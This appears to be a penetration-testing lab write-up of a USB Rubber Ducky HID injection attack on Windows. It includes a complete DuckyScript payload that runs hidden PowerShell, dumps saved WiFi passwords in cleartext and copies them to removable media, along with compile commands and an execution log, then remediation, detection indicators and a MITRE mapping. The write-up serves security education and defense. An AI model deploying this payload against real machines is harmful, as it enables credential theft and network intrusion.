> **English** | [Italiano](README.md)

# USB Rubber Ducky - Physical HID Attack

> - **Phase:** Social Engineering - Physical Payload Delivery via HID Injection
> - **Visibility:** Low for the system (the device appears as a legitimate keyboard, no suspicious drivers); High for the user present (the screen shows windows opening rapidly) but the execution speed (< 30 seconds) limits the intervention window
> - **Prerequisites:** Hak5 USB Rubber Ducky hardware (or emulator: Digispark ATtiny85, Teensy, Raspberry Pi Pico with CircuitPython); physical access to target machine (even momentary); DuckyScript knowledge for payload writing
> - **Output:** SE-010 (exfiltration of saved WiFi credentials in < 30 seconds via HID injection - severity High)

- **Operating Environment:** Hak5 USB Rubber Ducky (Attacker), Windows 10 VM (Victim)
- **Target:** Windows workstation with active user session
- **Framework:** DuckyScript 3.0
- **Documented Techniques:** HID Injection, Keystroke Automation, WiFi Credential Extraction

---

## Executive Summary

The USB Rubber Ducky is a physical attack device that exploits the implicit trust model that operating systems have toward HID (Human Interface Device) devices. When the Rubber Ducky is inserted into a USB port, the system identifies it as a keyboard - a device type that all operating systems accept without authentication, additional drivers, or user confirmation. The device then executes a DuckyScript payload that injects keystroke sequences at superhuman speed (milliseconds per character), executing commands in the context of the logged-in user.

The lab documented a payload that extracts all saved WiFi credentials on a Windows system in less than 30 seconds - from the moment of USB insertion to the completion of exfiltration. This speed makes the attack viable in extremely brief physical access scenarios (walking through an office, accessing an unattended reception desk).

---

## USB Rubber Ducky: WiFi Credential Exfiltration

**Finding ID:** `SE-010` | **Severity:** `High`

### Operational Context

The scenario simulates an attacker with momentary physical access to a Windows workstation with an active user session. The attacker inserts the Rubber Ducky into the USB port, the payload executes automatically, and the WiFi credentials are extracted and saved to a file. The entire operation completes in less than 30 seconds.

### PoC - Phase 1: DuckyScript Payload Writing

```Bash
# DuckyScript payload: WiFi password exfiltration (Windows)
# File: wifi_dump.txt

REM USB Rubber Ducky - WiFi Credential Extraction
REM Target: Windows 10/11 with active user session
REM Execution time: < 30 seconds

DELAY 1000
REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

REM Extract WiFi profiles and cleartext passwords
STRING $out = @(); (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {$name = $_.Matches.Groups[1].Value.Trim(); $out += "=== $name ==="; $details = netsh wlan show profile name="$name" key=clear; $key = ($details | Select-String 'Key Content\s*:\s*(.+)$'); if($key){$out += "Password: " + $key.Matches.Groups[1].Value} else {$out += "Password: (none)"}}; $out | Out-File "$env:TEMP\wifi_creds.txt"
ENTER
DELAY 3000

REM Exfiltration: copy to removable device (alternative: HTTP POST)
STRING Copy-Item "$env:TEMP\wifi_creds.txt" "$(Get-WmiObject Win32_Volume | Where-Object {$_.DriveType -eq 2} | Select-Object -First 1 -ExpandProperty DriveLetter)\loot.txt" -ErrorAction SilentlyContinue; Remove-Item "$env:TEMP\wifi_creds.txt"; exit
ENTER
```

### PoC - Phase 2: Compilation and Loading

```Bash
# DuckyScript compilation (with Java encoder or DuckToolkit)
java -jar duckencoder.jar -i wifi_dump.txt -o inject.bin -l it
# -l it: Italian keyboard layout

# The inject.bin file is loaded onto the Rubber Ducky's microSD
# Insert the microSD into the Rubber Ducky -> ready to use
```

### PoC - Phase 3: Execution and Results

```
# Rubber Ducky insertion into USB port:
# t=0s    - USB recognized as HID keyboard
# t=1s    - Initial DELAY
# t=1.5s  - Win+R opens "Run" dialog
# t=2s    - PowerShell starts (hidden window)
# t=3s    - WiFi extraction script running
# t=25s   - wifi_creds.txt file generated
# t=28s   - File copied to removable device
# t=30s   - Cleanup and exit                                <-- SE-010: completed in < 30s

# Contents of loot.txt (exfiltrated file):
=== WiFi-Ufficio ===
Password: C0mpany2026!WiFi                                  <-- corporate WiFi credential
=== WiFi-Guest ===
Password: Guest2026
=== Home-Network ===
Password: MyH0meP4ss!                                       <-- personal WiFi credential
```

### Remediation

- **Immediate action:** change passwords for all WiFi networks whose credentials were exfiltrated; audit USB devices connected in the last 24 hours (Event ID 6416 - PnP activity); check PowerShell logs for anomalous `netsh wlan` commands
- **Structural action:** implement USB Device Control via endpoint protection (whitelist of authorized devices by vendor ID/product ID); disable PowerShell for standard users or enforce Constrained Language Mode; deploy DLP (Data Loss Prevention) solutions that monitor file copying to removable devices; physical security policy: mandatory lock screen (GPO screen timeout), "clean desk" policy
- **Verification:** insert a test Rubber Ducky - device control must block device enumeration or the DLP solution must prevent file copying

---

## Lab Experience

The test was conducted with a real Hak5 USB Rubber Ducky hardware on a Windows 10 VM with an active user session. The first version of the payload used `cmd.exe` with `netsh wlan show profiles` and pipes, but the complexity of cmd commands with pipes and for loops caused timing errors (lost characters when the VM was under load). Switching to a PowerShell one-liner solved the problem: a single PS command handles the entire logic without timing dependencies between multiple commands.

The main challenge was the keyboard layout: the Rubber Ducky injects keystrokes based on the keyboard mapping specified during compilation. With Italian layout (`-l it`), special characters such as `|`, `@`, `{`, `}` are mapped correctly. A payload compiled with US layout on a system with an Italian keyboard generates incorrect characters (e.g., `\` instead of `|`), causing script failure.

The total execution time (28 seconds) includes a conservative 3-second DELAY for WiFi extraction. In a subsequent test with the DELAY reduced to 1.5 seconds, the payload completed in 18 seconds - but with the risk of race conditions if the system is slow. The balance between speed and reliability is a key consideration when writing DuckyScript payloads.

---

## Theoretical Analysis: The HID Trust Model

Modern operating systems implement sophisticated authentication and authorization mechanisms for software, networking, and users. However, HID devices (keyboards, mice) enjoy an implicit trust model: any device that identifies itself as a USB keyboard (USB Class 03h, Subclass 01h, Protocol 01h) is accepted and activated instantly, without additional drivers, without user confirmation, and without any integrity checks.

This trust model is a functional necessity: keyboards must work before any security software is loaded (for entering login passwords, accessing BIOS, handling security prompts). The Rubber Ducky exploits exactly this necessity: the device firmware emulates the USB descriptors of a standard keyboard, making it impossible for the operating system to distinguish it from a legitimate keyboard based solely on USB metadata.

Defense must therefore operate at a higher level: USB Device Control (whitelist based on VendorID/ProductID/SerialNumber), which blocks enumeration of unauthorized HID devices. Advanced solutions such as Microsoft Defender for Endpoint also implement behavioral monitoring: a keyboard injecting 500 characters per second with perfect precision is statistically distinguishable from a human user.

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement.

### Attacker Perspective (Red Team)

**Starting point:** corporate WiFi credentials exfiltrated (SE-010).

**Projected kill chain:**

```
[SE-010] WiFi credentials exfiltrated
        |
        v
Access to corporate WiFi network from unauthorized location (parking lot)
        |
        v
Network scanning -> identification of internal hosts and services
        |
        v
Exploitation of internal services not exposed to the Internet
        |
        v
Lateral Movement -> Domain compromise
```

### Defender Perspective (Blue Team)

**IOCs to monitor:**
- Event ID 6416: new PnP device connected (HID keyboard from unknown vendor)
- PowerShell Script Block Log with `netsh wlan` commands
- File copy to removable drives (DLP event)
- WiFi access from non-inventoried MAC address

**Hardening:**
- USB Device Control with hardware whitelist
- WiFi: 802.1X with certificates (not PSK) for corporate network
- WiFi segmentation: isolated guest network
- Automatic lock screen after 60 seconds of inactivity

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Initial Access | Replication Through Removable Media | `T1091` | USB Rubber Ducky insertion into target workstation |
| Execution | User Execution: Malicious File | `T1204.002` | DuckyScript payload executes automatically upon insertion (SE-010) |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | PowerShell one-liner for WiFi credential extraction |
| Credential Access | Credentials from Password Stores: Windows Credential Manager | `T1555.004` | Extraction of saved WiFi passwords via `netsh wlan show profile key=clear` |
| Collection | Input Capture: Credential API Hooking | `T1056.004` | HID injection simulates keyboard input for command execution |
| Exfiltration | Exfiltration Over Physical Medium: Exfiltration over USB | `T1052.001` | Credential file copied to removable device |
| Discovery | System Information Discovery | `T1082` | Enumeration of WiFi profiles and network configuration |

---

> **Note:** All documented activities were conducted in a virtualized lab environment. The Rubber Ducky was used exclusively on virtual machines owned by the author. The exfiltrated WiFi credentials were from test networks created ad hoc.
